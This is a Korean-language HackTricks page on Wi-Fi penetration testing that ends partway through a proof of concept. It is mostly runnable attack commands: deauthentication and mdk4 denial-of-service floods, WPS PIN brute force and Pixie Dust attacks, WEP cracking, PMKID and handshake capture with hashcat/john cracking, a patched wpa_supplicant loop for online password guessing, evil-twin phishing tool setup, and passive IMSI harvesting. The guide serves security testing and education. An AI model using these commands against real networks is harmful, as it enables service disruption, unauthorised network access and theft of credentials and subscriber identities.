# Pentesting Wifi

{{#include ../../banners/hacktricks-training.md}}

## Wifi 기본 명령
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## 도구

### Hijacker & NexMon (Android 내부 Wi-Fi)


{{#ref}}
enable-nexmon-monitor-and-injection-on-android.md
{{#endref}}

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**docker로 airgeddon 실행하기**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
From: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

Evil Twin, KARMA, and Known Beacons 공격을 수행한 다음 phishing template을 사용하여 네트워크의 실제 비밀번호를 얻거나 소셜 네트워크 자격증명을 획득할 수 있습니다.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

이 도구는 **WPS/WEP/WPA-PSK** 공격을 자동화합니다. 자동으로 다음을 수행합니다:

- 인터페이스를 monitor mode로 설정
- 가능한 네트워크를 스캔하고 대상(victim)을 선택할 수 있게 함
- WEP인 경우 - WEP 공격 실행
- WPA-PSK인 경우
- WPS인 경우: Pixie dust attack과 bruteforce attack을 수행합니다 (주의: brute-force attack은 오래 걸릴 수 있습니다). null PIN이나 database/generated PINs는 시도하지 않습니다.
- AP로부터 PMKID를 캡처하여 크랙을 시도
- handshake를 캡처하기 위해 AP의 클라이언트를 deauthenticate 시도
- PMKID나 Handshake가 있으면 top5000 passwords를 사용해 bruteforce를 시도

## 공격 요약

- **DoS**
- Deauthentication/disassociation -- 모든 사용자를 끊음(또는 특정 ESSID/Client)
- Random fake APs -- 네트를 숨기거나 스캐너를 충돌시킬 수 있음
- Overload AP -- AP를 죽이려고 시도 (보통 별로 유용하지 않음)
- WIDS -- IDS에 영향을 줌
- TKIP, EAPOL -- 일부 AP를 DoS할 수 있는 특정 공격들
- **Cracking**
- Crack **WEP** (여러 도구와 방법)
- **WPA-PSK**
- **WPS** pin "Brute-Force"
- **WPA PMKID** bruteforce
- \[DoS +] **WPA handshake** capture + Cracking
- **WPA-MGT**
- **Username capture**
- **Bruteforce** Credentials
- **Evil Twin** (with or without DoS)
- **Open** Evil Twin \[+ DoS] -- captive portal creds를 캡처하거나 LAN 공격 수행에 유용
- **WPA-PSK** Evil Twin -- password를 알면 네트워크 공격에 유용
- **WPA-MGT** -- 회사 credentials을 캡처하는 데 유용
- **KARMA, MANA**, **Loud MANA**, **Known beacon**
- **+ Open** -- captive portal creds를 캡처하거나 LAN 공격 수행에 유용
- **+ WPA** -- WPA handshakes를 캡처하는 데 유용

## Open / OWE 네트워크 간단 메모

- **Passive capture**는 open SSID에서 monitor mode와 tcpdump로 여전히 동작합니다:
```bash
iw wlan0 set type monitor
ip link set wlan0 up
iw wlan0 set channel 6
tcpdump -i wlan0 -w capture.pcap
```
- **OWE** (Opportunistic Wireless Encryption)는 스테이션별 키 교환을 수행(PSK 없음)하므로 "open" SSID에서도 무선 프레임이 암호화됩니다. WPA3 기반이므로 **802.11w PMF**도 적용되어 위조된 deauth/disassoc 프레임을 차단합니다.
- OWE는 가입자를 **인증하지 않습니다**: 누구나 association할 수 있으므로 마케팅 문구를 믿지 말고 **client isolation을 확인**하세요. 격리가 없으면 로컬 L2에서 ARP spoofing이나 responder-style poisoning이 여전히 작동합니다.
- **Evil Twin**은 더 강한 신호를 내세우면 open/OWE SSID에서 여전히 가능합니다; PMF는 단지 deauth 지름길만 제거합니다. 피해자가 위조된 TLS cert를 수락하면 완전한 HTTP(S) MitM을 되찾을 수 있습니다.
- open guest Wi-Fi에서의 Broadcast poisoning은 creds/hashes(LLMNR/NBT-NS/mDNS)를 쉽게 얻을 수 있습니다. 자세한 내용은 다음을 참조하세요:

{{#ref}}
../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## DOS

### Deauthentication 패킷

**설명 출처** [**here**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Deauthentication** 공격은 Wi-Fi 해킹에서 널리 사용되는 방법으로, "management" 프레임을 위조하여 기기를 네트워크에서 **강제로 연결 해제**합니다. 이들 암호화되지 않은 패킷은 클라이언트를 정식 네트워크에서 보낸 것으로 속여 공격자가 WPA handshakes를 수집해 크래킹에 이용하거나 네트워크 연결을 지속적으로 방해할 수 있게 합니다. 이 전술은 그 단순성 때문에 특히 위험하며 네트워크 보안에 중대한 영향을 미칩니다.

**Aireplay-ng를 사용한 Deauthentication**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
- -0은 deauthentication을 의미합니다
- 1은 보낼 deauths의 수입니다(원하면 여러 개 보낼 수 있음); 0은 계속 전송함을 의미합니다
- -a 00:14:6C:7E:40:80은 access point의 MAC address입니다
- -c 00:0F:B5:34:30:30은 deauthenticate할 client의 MAC address입니다; 이것을 생략하면 broadcast deauthentication이 전송됩니다(항상 동작하지 않을 수 있음)
- ath0은 interface 이름입니다

### Disassociation Packets

**Disassociation packets**, deauthentication packets와 유사하게, Wi-Fi 네트워크에서 사용되는 일종의 관리 프레임입니다. 이 패킷은 장치(예: 노트북 또는 스마트폰)와 access point(AP) 간의 연결을 끊는 역할을 합니다. disassociation과 deauthentication의 주요 차이점은 사용 시나리오에 있습니다. 한편 AP는 **deauthentication packets to remove rogue devices explicitly from the network, disassociation packets are typically sent when the AP is undergoing a shutdown**, restart 또는 relocating 중일 때는 일반적으로 연결된 모든 노드의 연결을 끊기 위해 이들 패킷을 보냅니다.

**이 공격은 mdk4(mode "d")로 수행할 수 있습니다:**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **mdk4에 의한 더 많은 DOS attacks**

**자세한 정보는** [**here**](https://en.kali.tools/?p=864)**.**

**ATTACK MODE b: Beacon Flooding**

clients에 가짜 APs를 표시하기 위해 beacon frames를 전송합니다. 이는 때때로 network scanners나 심지어 drivers를 충돌시킬 수 있습니다!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**ATTACK MODE a: Authentication Denial-Of-Service**

범위 내의 모든 접근 가능한 Access Points (APs)에 authentication frames를 전송하면, 특히 많은 clients가 관련된 경우 이러한 APs에 과부하를 일으킬 수 있습니다. 이러한 집중된 트래픽은 시스템 불안정으로 이어져 일부 APs가 멈추거나 심지어 리셋될 수 있습니다.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**ATTACK MODE p: SSID Probing and Bruteforcing**

Access Points (APs)에 대한 Probing은 SSID가 제대로 드러나는지 확인하고 AP의 유효 범위를 확인한다. 이 기법은 wordlist의 유무와 관계없이 **bruteforcing hidden SSIDs**와 결합되어 숨겨진 네트워크를 식별하고 접근하는 데 도움을 준다.

**ATTACK MODE m: Michael Countermeasures Exploitation**

무작위 또는 중복 패킷을 서로 다른 QoS 큐로 전송하면 **TKIP APs**에서 Michael Countermeasures가 트리거되어 AP가 1분 동안 셧다운될 수 있다. 이 방법은 효율적인 **DoS** (Denial of Service) 공격 전술이다.
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**ATTACK MODE e: EAPOL Start and Logoff Packet Injection**

AP에 **EAPOL Start frames**를 대량으로 보내면 **fake sessions**가 생성되어 AP가 과부하되고 정상 클라이언트의 연결을 차단합니다. 또는 **fake EAPOL Logoff messages**를 주입하면 클라이언트를 강제로 연결 해제할 수 있으며, 두 방법 모두 네트워크 서비스를 효과적으로 중단합니다.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**ATTACK MODE s: IEEE 802.11s mesh 네트워크를 대상으로 한 공격**

mesh 네트워크의 링크 관리 및 라우팅에 대한 다양한 공격.

**ATTACK MODE w: WIDS 혼동**

클라이언트를 여러 WDS 노드나 fake rogue APs에 교차 연결하면 Intrusion Detection and Prevention Systems를 조작하여 혼란을 유발하고 잠재적인 시스템 남용을 초래할 수 있습니다.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**ATTACK MODE f: Packet Fuzzer**

다양한 패킷 소스와 패킷 조작을 위한 포괄적인 수정자 세트를 제공하는 packet fuzzer.

### **Airggedon**

_**Airgeddon**_ 는 이전 항목에서 제안된 공격들 대부분을 제공합니다:

![](<../../images/image (95).png>)

## WPS

WPS (Wi‑Fi Protected Setup)는 라우터에 장치를 연결하는 과정을 간소화하여 **WPA** 또는 **WPA2** Personal로 암호화된 네트워크의 설정 속도와 편의성을 향상시킵니다. WEP 같은 쉽게 침해되는 보안에는 효과적이지 않습니다. WPS는 8자리 PIN을 사용하며, 두 부분으로 검증되기 때문에 조합 수가 제한되어 brute-force 공격에 취약합니다(약 11,000가지 가능성).

### WPS Bruteforce

이 작업을 수행하는 주요 도구는 2가지로, Reaver와 Bully입니다.

- **Reaver**는 WPS에 대한 강력하고 실용적인 공격으로 설계되었으며, 다양한 access points와 WPS 구현에서 테스트되었습니다.
- **Bully**는 C로 작성된 WPS brute force 공격의 **new implementation**입니다. 원래의 reaver 코드에 비해 의존성(dependencies)이 적고 메모리 및 cpu 성능이 향상되었으며, endianness를 올바르게 처리하고 더 견고한 옵션 집합을 제공합니다.

이 공격은 **WPS PIN의 취약성**을 악용합니다. 특히 처음 네 자리의 노출과 마지막 자리의 체크섬 역할 때문에 brute-force 공격이 용이해집니다. 그러나 공격자의 MAC 주소 차단(blocking MAC addresses)과 같은 brute-force 방어가 있으면 공격을 계속하기 위해서는 MAC address rotation이 필요합니다.

Bully나 Reaver 같은 도구로 WPS PIN을 얻으면 공격자는 WPA/WPA2 PSK를 유추할 수 있어 **지속적인 네트워크 접근**을 확보합니다.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

이 정교한 접근법은 알려진 취약점을 이용해 WPS PIN을 겨냥합니다:

1. **Pre-discovered PINs**: 특정 제조사가 동일한 WPS PIN을 사용하는 것으로 알려진 경우, 해당 PIN을 모아둔 데이터베이스를 이용합니다. 이 데이터베이스는 MAC-addresses의 처음 세 옥텟과 해당 제조사에서 사용될 가능성이 높은 PIN들을 연관시킵니다.
2. **PIN Generation Algorithms**: ComputePIN, EasyBox 같은 알고리즘을 활용해 AP의 MAC-address를 기반으로 WPS PIN을 계산합니다. Arcadyan 알고리즘은 추가로 device ID가 필요해 PIN 생성 과정에 한층 복잡성이 더해집니다.

### WPS Pixie Dust attack

**Dominique Bongard**는 일부 Access Points (APs)에서 비밀 코드로 알려진 **nonces**(**E-S1** 및 **E-S2**) 생성에 결함이 있음을 발견했습니다. 이 nonces를 알아낼 수 있으면 AP의 WPS PIN을 깨는 것이 쉬워집니다. AP는 자신이 합법적이며 가짜(rogue) AP가 아님을 증명하기 위해 PIN을 특수 코드(hash) 안에 드러냅니다. 이 nonces는 본질적으로 WPS PIN을 보관한 "금고"를 여는 "열쇠"와 같습니다. 자세한 내용은 [여기](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>)에서 볼 수 있습니다.

간단히 말하면, 문제는 일부 AP가 연결 과정에서 PIN을 암호화할 때 충분히 랜덤한 키를 사용하지 않았다는 것입니다. 이로 인해 PIN은 네트워크 외부에서 추측될 수 있게 되어 (offline brute force attack)에 취약해집니다.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
장치를 monitor mode로 전환하고 싶지 않거나 `reaver`와 `bully`에 문제가 있는 경우, [OneShot-C](https://github.com/nikita-yfh/OneShot-C)를 시도해볼 수 있습니다. 이 도구는 monitor mode로 전환하지 않고도 Pixie Dust attack을 수행할 수 있습니다.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Null Pin attack

설계가 부실한 일부 시스템은 심지어 **Null PIN** (빈 PIN 또는 존재하지 않는 PIN)이 접근을 허용하도록 하는 경우가 있는데, 이는 매우 드문 일이다. 도구 **Reaver**는 이 취약점을 테스트할 수 있지만, **Bully**는 그렇지 않다.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

All the proposed WPS attacks can be easily performed using _**airgeddon.**_

![](<../../images/image (219).png>)

- 5 and 6 lets you try **사용자 지정 PIN** (if you have any)
- 7 and 8 perform the **Pixie Dust attack**
- 13 allows you to test the **NULL PIN**
- 11 and 12 will **선택한 AP와 관련된 PINs를 사용 가능한 데이터베이스에서 수집** and **생성** 가능한 **PINs**을 사용해: ComputePIN, EasyBox and optionally Arcadyan (권장, 왜 안 해보겠는가?)
- 9 and 10 will test **가능한 모든 PIN**

## **WEP**

왜 취약한가

- RC4 seed is just **IV (24 bits) + shared key**. The IV is cleartext, tiny (2^24), and repeats quickly, so ciphertexts with the same IV reuse the keystream.
- XORing two ciphertexts with the same keystream leaks `PlaintextA ⊕ PlaintextB`; predictable headers + RC4 KSA biases (**FMS**) let you “vote” key bytes. **PTW** optimises this using ARP traffic to drop requirements to tens of thousands of packets instead of millions.
- Integrity is only **CRC32** (linear/unkeyed), so an attacker can flip bits and recompute CRC32 without the key → packet forgery/replay/ARP injection while waiting for IVs.

실제적인 공격 성공은 결정적이다:
```bash
airodump-ng --bssid <BSSID> --channel <ch> --write wep_capture wlan1mon  # collect IVs
# optionally speed up IVs without deauth by replaying ARP
aireplay-ng --arpreplay -b <BSSID> -h <clientMAC> wlan1mon
aircrack-ng wep_capture-01.cap  # PTW attack recovers key once IV threshold is met
```
Airgeddon은 가이드형 UI를 선호하는 경우 사용할 수 있도록 여전히 "All-in-One" WEP 워크플로우를 포함하고 있습니다.

![](<../../images/image (432).png>)

---

---

## WPA/WPA2 PSK

### PMKID

In 2018, **hashcat** [revealed](https://hashcat.net/forum/thread-7717.html) a new attack method, unique because it only needs **한 개의 패킷만** and doesn't require any clients to be connected to the target AP—just interaction between the attacker and the AP.

많은 최신 라우터는 연결(association) 중 **첫 번째 EAPOL** 프레임에 `Robust Security Network`로 알려진 **옵션 필드**를 추가합니다. 여기에는 `PMKID`가 포함됩니다.

As the original post explains, the **PMKID** is created using known data:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
"PMK Name"이(가) 고정되어 있고, AP의 BSSID와 스테이션을 알고 있으며 `PMK`가 full 4-way handshake의 것과 동일하기 때문에, **hashcat**은 이 정보를 사용해 PSK를 crack하고 passphrase를 recover할 수 있습니다!

이 정보를 **수집**하고 로컬에서 password를 **bruteforce**하려면 다음을 수행하세요:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
해당 **PMKIDs captured**는 **console**에 표시되며 또한 \_ **/tmp/attack.pcap**\_에 **저장**됩니다.\
이제 캡처를 **hashcat/john** 형식으로 변환하고 crack it:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
정상적인 hash의 형식은 **4개의 부분**으로 구성됩니다. 예: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838` 만약 당신의 것이 **오직** **3개의 부분**만 포함한다면, 그것은 **유효하지 않습니다** (PMKID 캡처가 유효하지 않았습니다).

참고로 `hcxdumptool`은 **handshakes**도 캡처합니다 (이런 형식이 표시됩니다: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). **handshakes**를 `cap2hccapx`를 사용해 **hashcat**/**john** 형식으로 **변환**할 수 있습니다.
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_I have noticed that some handshakes captured with this tool couldn't be cracked even knowing the correct password. I would recommend to capture handshakes also via traditional way if possible, or capture several of them using this tool._

### Handshake capture

**WPA/WPA2** 네트워크에 대한 공격은 **handshake**를 캡처하고 비밀번호를 **offline**에서 **crack** 시도함으로써 수행할 수 있습니다. 이 과정은 특정 네트워크와 특정 **channel**의 **BSSID** 통신을 모니터링하는 것을 포함합니다. 다음은 간단한 가이드입니다:

1. 대상 네트워크의 **BSSID**, **channel**, 그리고 **connected client**를 식별합니다.
2. 지정된 channel과 BSSID에서 네트워크 트래픽을 모니터링하여 handshake를 캡처하려면 `airodump-ng`를 사용합니다. 명령은 다음과 같습니다:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. handshake를 캡처할 확률을 높이기 위해 클라이언트를 잠시 네트워크에서 분리하여 재인증을 강제하십시오. 이는 클라이언트에 deauthentication packets를 전송하는 `aireplay-ng` 명령으로 수행할 수 있습니다:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_클라이언트가 deauthenticated된 경우 다른 AP나, 경우에 따라 다른 network에 연결을 시도할 수 있음을 유의하세요._

`airodump-ng`에 handshake 정보가 표시되면 이는 handshake가 캡처되었음을 의미하므로 리스닝을 중지할 수 있습니다:

![](<../../images/image (172) (1).png>)

handshake가 캡처되면 `aircrack-ng`로 **crack**할 수 있습니다:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### 파일에 handshake가 있는지 확인

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_이 도구가 완료된 handshake보다 먼저 ESSID의 미완료 handshake를 찾으면, 유효한 handshake를 감지하지 못합니다._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
#### `wpa_supplicant` ctrl socket을 이용한 더 빠른 온라인 PSK 추측 (no clients/PMKID)

주변에 clients가 없고 AP가 PMKID를 거부하는 경우, respawning supplicants 없이 PSKs를 온라인에서 반복 시도할 수 있습니다:

- `wpa_supplicant.c`를 패치하여 auth failure backoff 로직(약 `ssid->auth_failures` 부근)에서 `dur = 0;`을 강제로 설정하면 temporary-disable 타이머를 사실상 비활성화합니다.
- 단일 daemon을 control socket으로 실행:
```bash
# wpa_supplicant.conf
ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=root
update_config=1

wpa_supplicant -B -i wlp3s0 -c wpa_supplicant.conf
```
- 동일한 scan과 network를 재사용하여 제어 인터페이스를 통해 구동하세요:
```text
ADD_NETWORK
SET_NETWORK 0 ssid "<ssid>"
ENABLE_NETWORK 0
SCAN
(loop)
SET_NETWORK 0 psk "<candidate>"
REASSOCIATE
wait for CTRL-EVENT-CONNECTED / DISCONNECTED
```
소켓 이벤트(`CTRL-EVENT-CONNECTED` / `CTRL-EVENT-DISCONNECTED`)를 읽는 작은 Python 루프는 스캔 오버헤드 없이 약 ~100개의 시도를 약 5분 만에 테스트할 수 있습니다. 여전히 노이즈가 크고 탐지될 수 있지만, 시도마다 프로세스를 재시작하거나 백오프 지연을 적용하는 것을 피할 수 있습니다.

## **WPA Enterprise (MGT)**

In **enterprise WiFi setups, you'll encounter various authentication methods**, 각각 다른 보안 수준과 관리 기능을 제공합니다. `airodump-ng` 같은 도구로 네트워크 트래픽을 분석할 때 이러한 인증 유형을 나타내는 식별자를 볼 수 있습니다. 일반적인 방법으로는 다음이 있습니다:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
- 이 방법은 하드웨어 토큰과 일회용 비밀번호를 EAP-PEAP 내에서 지원합니다. MSCHAPv2와 달리 peer challenge를 사용하지 않으며 비밀번호를 액세스 포인트로 평문으로 전송하므로 downgrade 공격에 취약할 수 있습니다.
2. **EAP-MD5 (Message Digest 5)**:
- 클라이언트가 비밀번호의 MD5 해시를 전송하는 방식입니다. 사전 공격에 취약하고 서버 인증이 없으며 세션별 WEP 키를 생성할 수 없기 때문에 **권장되지 않습니다**.
3. **EAP-TLS (Transport Layer Security)**:
- 클라이언트 측과 서버 측 인증서를 모두 사용하여 인증하며 통신 보호를 위해 사용자 기반 및 세션 기반 WEP 키를 동적으로 생성할 수 있습니다.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
- 암호화된 터널을 통해 상호 인증을 제공하며 동적, 사용자별, 세션별 WEP 키를 도출하는 방법을 제공합니다. 서버 측 인증서만 필요하고 클라이언트는 자격증명을 사용합니다.
5. **PEAP (Protected Extensible Authentication Protocol)**:
- EAP와 유사하게 보호된 통신을 위해 TLS 터널을 생성합니다. 터널이 제공하는 보호 덕분에 상위에 더 약한 인증 프로토콜을 사용할 수 있습니다.
- **PEAP-MSCHAPv2**: 종종 PEAP로 지칭되며, 취약한 MSCHAPv2 challenge/response 메커니즘을 보호용 TLS 터널과 결합합니다.
- **PEAP-EAP-TLS (or PEAP-TLS)**: EAP-TLS와 유사하지만 인증서를 교환하기 전에 TLS 터널을 먼저 시작하여 추가적인 보안층을 제공합니다.

You can find more information about these authentication methods [here ](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol)and [here](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Username Capture

Reading [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) it looks like if you are using **EAP** the **"Identity"** **messages** must be **supported**, and the **username** is going to be sent in **clear** in the **"Response Identity"** messages.

심지어 가장 안전한 인증 방법 중 하나인 **PEAP-EAP-TLS**를 사용하더라도 **EAP 프로토콜에서 전송되는 username을 캡처하는 것**이 가능합니다. 이를 수행하려면 인증 통신을 캡처합니다(채널 내에서 `airodump-ng`를 시작하고 동일 인터페이스에서 `wireshark`를 실행)하고 패킷을 `eapol`로 필터링하세요.\
"**Response, Identity**" 패킷 안에서 클라이언트의 **username**이 나타납니다.

![](<../../images/image (850).png>)

### Anonymous Identities

Identity hiding은 EAP-PEAP와 EAP-TTLS 모두에서 지원됩니다. WiFi 네트워크의 맥락에서 EAP-Identity 요청은 일반적으로 association 과정 중에 액세스 포인트(AP)에 의해 시작됩니다. 사용자 익명성을 보호하기 위해 사용자의 디바이스에 있는 EAP 클라이언트의 응답은 초기 RADIUS 서버가 요청을 처리하는 데 필요한 최소한의 정보만 포함합니다. 이 개념은 다음 시나리오를 통해 설명할 수 있습니다:

- EAP-Identity = anonymous
- 이 시나리오에서는 모든 사용자가 식별자로서 псевдоним "anonymous"를 사용합니다. 초기 RADIUS 서버는 EAP-PEAP 또는 EAP-TTLS 서버로 동작하며 PEAP 또는 TTLS 프로토콜의 서버 측을 관리합니다. 내부(보호된) 인증 방법은 로컬에서 처리되거나 원격(홈) RADIUS 서버에 위임됩니다.
- EAP-Identity = anonymous@realm_x
- 이 경우 서로 다른 realm의 사용자들이 자신의 신원을 숨기면서 해당 realm을 표시합니다. 이를 통해 초기 RADIUS 서버는 EAP-PEAP 또는 EAP-TTLS 요청을 홈 realm의 RADIUS 서버로 프록시할 수 있으며, 해당 홈 서버가 PEAP 또는 TTLS 서버로 동작합니다. 초기 RADIUS 서버는 단지 RADIUS 릴레이 노드로 동작합니다.
- 또는 초기 RADIUS 서버가 EAP-PEAP 또는 EAP-TTLS 서버로 동작하면서 보호된 인증 방법을 처리하거나 다른 서버로 전달할 수도 있습니다. 이 옵션은 다양한 realm에 대해 서로 다른 정책을 구성하는 것을 용이하게 합니다.

EAP-PEAP에서는 PEAP 서버와 PEAP 클라이언트 사이에 TLS 터널이 수립된 후 PEAP 서버가 EAP-Identity 요청을 시작하여 TLS 터널을 통해 전송합니다. 클라이언트는 이 두 번째 EAP-Identity 요청에 대해 암호화된 터널을 통해 사용자의 진짜 신원을 포함한 EAP-Identity 응답으로 답합니다. 이 접근 방식은 802.11 트래픽을 도청하는 누구에게도 사용자의 실제 신원이 노출되는 것을 효과적으로 방지합니다.

EAP-TTLS는 약간 다른 절차를 따릅니다. EAP-TTLS에서는 클라이언트가 일반적으로 TLS 터널로 보호된 PAP 또는 CHAP로 인증합니다. 이 경우 클라이언트는 터널 수립 후 전송되는 초기 TLS 메시지에 User-Name 속성과 Password 또는 CHAP-Password 속성을 포함합니다.

어떤 프로토콜을 선택하든 PEAP/TTLS 서버는 TLS 터널이 수립된 후 사용자의 실제 신원을 알게 됩니다. 실제 신원은 user@realm 또는 단순히 user로 표현될 수 있습니다. PEAP/TTLS 서버가 사용자 인증도 담당하는 경우 이제 사용자의 신원을 알고 TLS 터널로 보호된 인증 방법을 진행합니다. 또는 PEAP/TTLS 서버는 새로운 RADIUS 요청을 사용자의 홈 RADIUS 서버로 전달할 수 있습니다. 이 새로운 RADIUS 요청에는 PEAP 또는 TTLS 프로토콜 레이어가 생략됩니다. 보호된 인증 방법이 EAP인 경우 내부 EAP 메시지는 EAP-PEAP 또는 EAP-TTLS 래퍼 없이 홈 RADIUS 서버로 전송됩니다. 나가는 RADIUS 메시지의 User-Name 속성은 들어오는 RADIUS 요청의 anonymous User-Name을 대체하여 사용자의 실제 신원을 포함합니다. 보호된 인증 방법이 PAP 또는 CHAP인 경우(이는 TTLS에서만 지원됨) TLS 페이로드에서 추출된 User-Name 및 기타 인증 속성들이 나가는 RADIUS 메시지에 대체되어 들어오는 RADIUS 요청의 anonymous User-Name 및 TTLS EAP-Message 속성을 대체합니다.

For more info check [https://www.interlinknetworks.com/app_notes/eap-peap.htm](https://www.interlinknetworks.com/app_notes/eap-peap.htm)

### SIM-based EAP (EAP-SIM/EAP-AKA) identity leakage (IMSI exposure)

SIM-based Wi‑Fi authentication using EAP‑SIM/EAP‑AKA over 802.1X can leak the permanent subscriber identifier (IMSI) in cleartext during the unauthenticated identity phase if the deployment doesn’t implement pseudonyms/protected identities or a TLS tunnel around the inner EAP.

Where the leak happens (high level):
- 802.11 association completes to the SSID (often carrier offload SSIDs like FreeWifi_secure, eduroam-like operator realms, etc.).
- Authenticator sends EAP-Request/Identity.
- Vulnerable clients answer EAP-Response/Identity with their permanent identity = IMSI encoded as a 3GPP NAI, prior to any protection.
- Example NAI: 20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
- Anyone passively listening to RF can read that frame. No 4-way handshake or TLS keying is needed.

Quick PoC: passive IMSI harvesting on EAP‑SIM/AKA networks lacking identity privacy
<details>
<summary>확장하려면 클릭</summary>
```bash
# 1) Enable monitor mode
airmon-ng start wlan0

# 2) Optional: lock channel to the target BSS
airodump-ng wlan0mon --essid <SSID>

# 3) Capture 802.1X/EAP frames
# Wireshark display filters:
#   eap || eapol
#   (identity specifically): eap.code == 2 && eap.type == 1
# Kismet: add source wlan0mon; enable 802.1X/EAP views
# tcpdump (pcap capture):
#   tcpdump -i wlan0mon -s 0 -w eapsim_identity.pcap

# 4) Wait for a device to auto-connect to the SSID
# 5) Inspect the first EAP-Response/Identity frame
# Expected: ASCII NAI containing IMSI, e.g.
